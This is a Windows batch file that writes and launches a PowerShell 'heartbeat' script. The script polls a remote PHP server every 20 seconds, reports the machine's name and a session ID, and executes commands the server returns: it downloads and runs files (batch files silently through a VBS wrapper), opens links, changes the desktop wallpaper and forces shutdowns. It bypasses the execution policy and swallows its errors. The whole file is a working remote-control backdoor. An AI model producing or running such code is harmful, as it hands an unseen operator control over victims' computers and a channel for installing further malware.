@echo off
:: Generate a unique session identifier using PowerShell and store it in SESSION_ID
for /f %%i in ('powershell -Command "[guid]::NewGuid().ToString()"') do set SESSION_ID=%%i

:: Create or overwrite the PowerShell script "heartbeat.ps1"
echo $sessionId = "%SESSION_ID%" > heartbeat.ps1
echo $pcName = $env:COMPUTERNAME >> heartbeat.ps1
echo $url = "http://byxln4cj.atwebpages.com/update.php" >> heartbeat.ps1
echo while ($true) { >> heartbeat.ps1
echo     try { >> heartbeat.ps1
echo         $response = Invoke-RestMethod -Uri $url -Method POST -Body @{ session_id = $sessionId; pc_name = $pcName } >> heartbeat.ps1
echo         if ($response.status -eq "command") { >> heartbeat.ps1
echo             switch ($response.type) { >> heartbeat.ps1
echo                 "open_link" { Start-Process -FilePath $response.value -WindowStyle Maximized } >> heartbeat.ps1
echo                 "download_run" { >> heartbeat.ps1
echo                     $uri = [System.Uri]$response.value >> heartbeat.ps1
echo                     $fileName = [System.IO.Path]::GetFileName($uri.LocalPath) >> heartbeat.ps1
echo                     if (-not $fileName) { $fileName = "downloaded_file" } >> heartbeat.ps1
echo                     if ($fileName -like "*.bat") { >> heartbeat.ps1
echo                         $folder = [System.IO.Path]::GetTempPath() >> heartbeat.ps1
echo                     } else { >> heartbeat.ps1
echo                         $folder = "$env:USERPROFILE\Downloads" >> heartbeat.ps1
echo                     } >> heartbeat.ps1
echo                     $downloadPath = [System.IO.Path]::Combine($folder, $fileName) >> heartbeat.ps1
echo                     Invoke-WebRequest -Uri $response.value -OutFile $downloadPath >> heartbeat.ps1
echo                     if ($fileName -like "*.bat") { >> heartbeat.ps1
echo                         $vbsPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "run_silent.vbs") >> heartbeat.ps1
echo                         $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run """' + $downloadPath + '""", 0, False' >> heartbeat.ps1
echo                         Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII >> heartbeat.ps1
echo                         Start-Process -FilePath $vbsPath >> heartbeat.ps1
echo                     } else { >> heartbeat.ps1
echo                         Start-Process -FilePath $downloadPath -WindowStyle Maximized >> heartbeat.ps1
echo                     } >> heartbeat.ps1
echo                 } >> heartbeat.ps1
echo                 "set_wallpaper" { >> heartbeat.ps1
echo                     $uri = [System.Uri]$response.value >> heartbeat.ps1
echo                     $fileName = [System.IO.Path]::GetFileName($uri.LocalPath) >> heartbeat.ps1
echo                     if (-not $fileName) { $fileName = "wallpaper.jpg" } >> heartbeat.ps1
echo                     $folder = "$env:USERPROFILE\Downloads" >> heartbeat.ps1
echo                     $downloadPath = [System.IO.Path]::Combine($folder, $fileName) >> heartbeat.ps1
echo                     Invoke-WebRequest -Uri $response.value -OutFile $downloadPath >> heartbeat.ps1
echo                     $code = '[DllImport("user32.dll")] public static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);' >> heartbeat.ps1
echo                     $spi = Add-Type -MemberDefinition $code -Name Wallpaper -Namespace Win32 -PassThru >> heartbeat.ps1
echo                     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $downloadPath >> heartbeat.ps1
echo                     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value 2 >> heartbeat.ps1
echo                     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0 >> heartbeat.ps1
echo                     $spi::SystemParametersInfo(20, 0, $downloadPath, 3) >> heartbeat.ps1
echo                 } >> heartbeat.ps1
echo                 "stop_pc" { Stop-Computer -Force } >> heartbeat.ps1
echo             } >> heartbeat.ps1
echo         } >> heartbeat.ps1
echo     } catch { >> heartbeat.ps1
echo         # Silent error handling >> heartbeat.ps1
echo     } >> heartbeat.ps1
echo     Start-Sleep -Seconds 20 >> heartbeat.ps1
echo } >> heartbeat.ps1

:: Run the PowerShell script
powershell -ExecutionPolicy Bypass -File heartbeat.ps1
